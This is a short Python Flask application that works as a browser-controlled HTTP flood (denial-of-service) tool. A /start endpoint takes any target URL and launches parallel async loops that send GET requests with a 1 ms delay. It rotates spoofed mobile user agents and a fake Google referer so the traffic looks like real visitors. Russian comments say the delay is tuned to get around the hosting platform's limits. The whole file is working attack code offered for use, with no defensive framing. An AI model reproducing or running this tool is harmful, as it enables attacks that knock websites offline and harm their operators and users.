import asyncio
import aiohttp
from flask import Flask, render_template, request, jsonify
import threading
import random
import requests

app = Flask(__name__)

attack_running = False
stats = {"requests_sent": 0, "errors": 0}

USER_AGENTS = [
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/119.0 Firefox/119.0",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
]

async def attack(url):
    global attack_running, stats
    timeout = aiohttp.ClientTimeout(total=2)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        while attack_running:
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Referer': 'https://www.google.com/'
            }
            try:
                async with session.get(url, headers=headers) as response:
                    stats["requests_sent"] += 1
            except:
                stats["errors"] += 1
            await asyncio.sleep(0.001) # Минимальная задержка для обхода лимитов Render

def start_loop(url):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    # Запускаем сразу 10 параллельных задач на одном потоке для мощи
    tasks = [attack(url) for _ in range(10)]
    loop.run_until_complete(asyncio.gather(*tasks))

@app.route('/')
def index(): return render_template('index.html')

@app.route('/start', methods=['POST'])
def start():
    global attack_running, stats
    url = request.json.get('url')
    if not attack_running:
        attack_running = True
        stats = {"requests_sent": 0, "errors": 0}
        threading.Thread(target=start_loop, args=(url,), daemon=True).start()
    return jsonify({"status": "active"})

@app.route('/stop', methods=['POST'])
def stop():
    global attack_running
    attack_running = False
    return jsonify({"status": "stopped"})

@app.route('/stats')
def get_stats(): return jsonify(stats)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
  
